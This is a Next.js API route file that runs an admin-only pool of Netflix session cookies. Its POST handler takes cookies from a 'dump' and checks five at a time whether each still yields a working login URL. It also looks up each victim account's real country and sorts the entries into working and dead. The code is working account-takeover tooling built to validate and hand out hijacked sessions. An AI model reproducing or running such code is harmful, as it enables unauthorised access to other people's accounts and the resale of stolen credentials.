import { NextResponse } from "next/server";
import { verifyAdmin } from "@/lib/auth";
import { extractCookieDict } from "@/lib/cookies";
import { netflixIdPreview } from "@/lib/mask";
import { detectCountryLabel, fetchRealCountry } from "@/lib/country";
import { fetchNftoken, ClientError } from "@/lib/client";
import {
  poolList,
  poolAddMany,
  poolClear,
  poolClearDead,
  isDatabaseConnected,
  type PoolEntry,
} from "@/lib/pool";

export const runtime = "nodejs";
export const dynamic = "force-dynamic";
export const maxDuration = 60;

function makeId(): string {
  try {
    return crypto.randomUUID();
  } catch {
    return Date.now().toString(36) + Math.random().toString(36).slice(2, 8);
  }
}

/** GET  — list all pool entries (admin only). */
export async function GET(request: Request) {
  if (!verifyAdmin(request)) {
    return NextResponse.json({ error: "Unauthorized." }, { status: 401 });
  }
  const entries = await poolList();
  return NextResponse.json({
    entries,
    database: isDatabaseConnected() ? "connected" : "local",
  });
}

/** POST — add cookies to the pool and auto-check them. */
export async function POST(request: Request) {
  if (!verifyAdmin(request)) {
    return NextResponse.json({ error: "Unauthorized." }, { status: 401 });
  }

  let body: unknown;
  try {
    body = await request.json();
  } catch {
    return NextResponse.json({ error: "Invalid JSON." }, { status: 400 });
  }

  const { cookies } = body as { cookies?: unknown };
  if (!Array.isArray(cookies) || cookies.length === 0) {
    return NextResponse.json(
      { error: "Provide { cookies: string[] } or { cookies: [{ cookie, label? }] }." },
      { status: 400 },
    );
  }

  // Normalise input — accept both plain strings and objects.
  const inputs: { cookie: string; label?: string; country?: string }[] = cookies.map(
    (c: unknown) => {
      if (typeof c === "string") return { cookie: c };
      if (c && typeof c === "object" && "cookie" in c) {
        const obj = c as { cookie: string; label?: string; country?: string };
        return { cookie: String(obj.cookie), label: obj.label, country: obj.country };
      }
      return { cookie: String(c) };
    },
  );

  const validInputs = inputs.filter((i) => extractCookieDict(i.cookie)["NetflixId"]);
  const results: PoolEntry[] = [];
  const concurrency = 5;
  let cursor = 0;

  async function checkWorker() {
    while (cursor < validInputs.length) {
      const idx = cursor++;
      const input = validInputs[idx];
      const entry: PoolEntry = {
        id: makeId(),
        label: input.label || "",
        country: input.country || detectCountryLabel(input.cookie) || undefined,
        raw: input.cookie,
        preview: netflixIdPreview(input.cookie),
        status: "unchecked",
        addedAt: Date.now(),
      };

      try {
        const dict = extractCookieDict(entry.raw);
        const result = await fetchNftoken(dict);
        entry.status = "working";
        entry.loginUrl = result.login_url;
        entry.expires = result.expires;
        entry.expiryText = result.expiry_text;
        entry.lastChecked = Date.now();

        // If no country was in the dump text, live-fetch the REAL account country from Netflix
        if (!entry.country) {
          const real = await fetchRealCountry(entry.raw, undefined, entry.loginUrl);
          if (real) entry.country = real;
        }
      } catch (err) {
        const isClient = err instanceof ClientError;
        entry.status = isClient ? "invalid" : "error";
        entry.message = err instanceof Error ? err.message : String(err);
        entry.lastChecked = Date.now();
      }

      results.push(entry);
    }
  }

  await Promise.all(
    Array.from({ length: Math.min(concurrency, validInputs.length) }, () => checkWorker()),
  );

  if (results.length > 0) {
    await poolAddMany(results);
  }

  const working = results.filter((r) => r.status === "working").length;
  const dead = results.filter((r) => r.status === "invalid").length;

  const currentList = await poolList();
  return NextResponse.json({
    added: results.length,
    working,
    dead,
    entries: currentList,
    database: isDatabaseConnected() ? "connected" : "local",
  });
}

/** DELETE — clear pool. ?mode=dead clears only dead entries. */
export async function DELETE(request: Request) {
  if (!verifyAdmin(request)) {
    return NextResponse.json({ error: "Unauthorized." }, { status: 401 });
  }
  const url = new URL(request.url);
  const mode = url.searchParams.get("mode");
  if (mode === "dead") {
    const removed = await poolClearDead();
    const entries = await poolList();
    return NextResponse.json({ removed, entries });
  }
  const removed = await poolClear();
  return NextResponse.json({ removed });
}
